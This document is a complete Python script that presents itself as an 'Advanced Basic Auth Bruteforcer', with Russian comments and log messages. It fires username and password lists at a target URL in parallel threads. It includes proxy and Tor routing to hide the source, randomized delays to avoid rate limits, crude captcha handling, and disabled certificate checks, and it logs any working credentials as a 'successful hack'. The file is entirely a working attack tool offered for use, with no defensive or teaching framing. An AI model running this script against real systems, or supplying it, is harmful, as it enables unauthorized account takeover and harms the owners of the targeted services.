import requests
from requests.auth import HTTPBasicAuth
import concurrent.futures
from argparse import ArgumentParser
import time
import logging
from tqdm import tqdm
import random

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("success.log"),
        logging.StreamHandler()
    ]
)

def solve_simple_captcha(captcha_url):
    """Простая обработка капчи (если она в виде текста)"""
    try:
        response = requests.get(captcha_url, verify=False)
        if response.status_code == 200:
            # Пример: капча — это просто текст (например, '12345')
            return response.text.strip()
    except:
        pass
    return None

def try_credentials(target_url, username, password, proxy=None, delay=0, captcha_url=None):
    proxies = None
    if proxy:
        proxies = {
            "http": proxy,
            "https": proxy,
        }
    
    try:
        # Задержка между запросами
        if delay > 0:
            time.sleep(delay + random.uniform(-0.5, 0.5))  # Случайный разброс
            
        # Если есть капча, сначала получаем её
        captcha_solution = None
        if captcha_url:
            captcha_solution = solve_simple_captcha(captcha_url)
            if not captcha_solution:
                logging.error(f"Не удалось решить капчу для {username}:{password}")
                return False
        
        # Формируем запрос
        session = requests.Session()
        if captcha_solution:
            session.headers.update({"X-Captcha-Response": captcha_solution})
        
        response = session.get(
            target_url,
            auth=HTTPBasicAuth(username, password),
            proxies=proxies,
            timeout=15,
            verify=False
        )
        
        if response.status_code == 200:
            logging.info(f"✅ Успех! {username}:{password} | Ответ: {response.text[:50]}...")
            return True
        else:
            logging.debug(f"❌ Неверно: {username}:{password} (Status: {response.status_code})")
            return False
    except Exception as e:
        logging.error(f"⚠️ Ошибка для {username}:{password} -> {str(e)}")
        return False

def main():
    parser = ArgumentParser(description="Advanced Basic Auth Bruteforcer")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com)")
    parser.add_argument("-U", "--user", help="Single username")
    parser.add_argument("-P", "--pass", help="Single password")
    parser.add_argument("-Uf", "--userfile", help="File with usernames (one per line)")
    parser.add_argument("-Pf", "--passfile", help="File with passwords (one per line)")
    parser.add_argument("-p", "--proxy", help="Proxy (e.g., http://127.0.0.1:8080, socks5://127.0.0.1:9050)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests (seconds)")
    parser.add_argument("-c", "--captcha", help="URL to fetch CAPTCHA (if applicable)")
    
    args = parser.parse_args()
    
    # Загрузка логинов и паролей
    usernames = []
    passwords = []
    
    if args.user:
        usernames.append(args.user)
    elif args.userfile:
        with open(args.userfile, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
    
    if getattr(args, "pass"):
        passwords.append(getattr(args, "pass"))
    elif args.passfile:
        with open(args.passfile, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    
    if not usernames or not passwords:
        logging.error("Укажите логины и пароли!")
        return
    
    logging.info(f"🔎 Цель: {args.url}")
    logging.info(f"👥 Логинов: {len(usernames)}, 🔑 Паролей: {len(passwords)}")
    logging.info(f"⚡ Потоков: {args.threads}")
    if args.proxy:
        logging.info(f"🔄 Прокси: {args.proxy}")
    if args.delay > 0:
        logging.info(f"⏳ Задержка: {args.delay} сек")
    if args.captcha:
        logging.info(f"🤖 Капча: {args.captcha}")
    
    # Общее количество попыток
    total_attempts = len(usernames) * len(passwords)
    progress_bar = tqdm(total=total_attempts, desc="Bruteforcing", unit="attempt")
    
    # Многопоточный брутфорс
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for user in usernames:
            for pwd in passwords:
                futures.append(
                    executor.submit(
                        try_credentials,
                        args.url,
                        user,
                        pwd,
                        args.proxy,
                        args.delay,
                        args.captcha
                    )
                )
        
        success = False
        for future in concurrent.futures.as_completed(futures):
            progress_bar.update(1)
            if future.result():
                success = True
                executor.shutdown(wait=False)
                for f in futures:
                    f.cancel()
                break
    
    progress_bar.close()
    if success:
        logging.info("🎉 Успешный взлом! Результаты сохранены в success.log")
    else:
        logging.warning("😢 Не удалось подобрать учетные данные.")

if __name__ == "__main__":
    main()